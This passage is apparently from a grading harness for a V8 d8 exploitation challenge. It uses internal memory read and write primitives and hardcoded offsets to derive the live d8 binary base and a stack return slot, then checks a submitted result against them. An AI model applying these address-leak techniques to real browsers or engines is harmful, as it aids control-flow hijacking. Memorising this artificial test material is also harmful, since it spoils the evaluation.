...
let usedStateRead = false;
let usedRead64 = false;

function internalSigRead(offset) {
    return call_fn(-1n, BigInt(offset))[0];
}

function internalSigWrite(offset, value) {
    call_fn(BigInt(offset), BigInt(value))[0];
}

function stateRead(offset) {
    const ofs = BigInt(offset);
    if (ofs !== 0x10n) {
        throw new Error("Read the dispatch-state region pointer at offset 0x10.");
    }
    usedStateRead = true;
...
const sourceSignatureState = internalSigRead(0x30n);
internalSigWrite(0x28n, sourceSignatureState);

const d8AnchorCandidates = Object.freeze([
    Object.freeze({ offset: 0x40b0n, delta: 0x1ed7b8n }),
    Object.freeze({ offset: 0x4708n, delta: 0x14f985n }),
    Object.freeze({ offset: 0x8c40n, delta: 0x1867f3n }),
    Object.freeze({ offset: 0x8c70n, delta: 0x18c423n }),
    Object.freeze({ offset: 0x9210n, delta: 0x15f1a0n }),
]);
const stackAnchorOffset = 0x4050n;
const stackReturnDelta = 0xba0n;
...
function findD8BaseFromDispatchState(partitionBase) {
    for (const { offset, delta } of d8AnchorCandidates) {
        const pointer = read64(partitionBase + offset);
        if (pointer < 0x500000000000n || pointer >= 0x700000000000n) continue;
        const base = pointer - delta;
        if ((base & 0xfffn) !== 0n) continue;
        if (read32(base) === 0x464c457f && read8(base + 4n) === 2) return base;
    }
    throw new Error("Harness error: failed to derive the live d8 base.");
}

const partitionBase = (internalSigRead(0x10n) & ~0xffffffffn);
const expectedD8Base = findD8BaseFromDispatchState(partitionBase);
const expectedStackRet = read64(partitionBase + stackAnchorOffset) - stackReturnDelta;
...
if (BigInt(result.d8Base) !== expectedD8Base) {
    throw new Error("d8Base does not match the live ELF base derived from dispatch-state anchors.");
}
if (BigInt(result.stackRet) !== expectedStackRet) {
    throw new Error("stackRet does not match the live return slot derived from the dispatch-state stack anchor.");
}
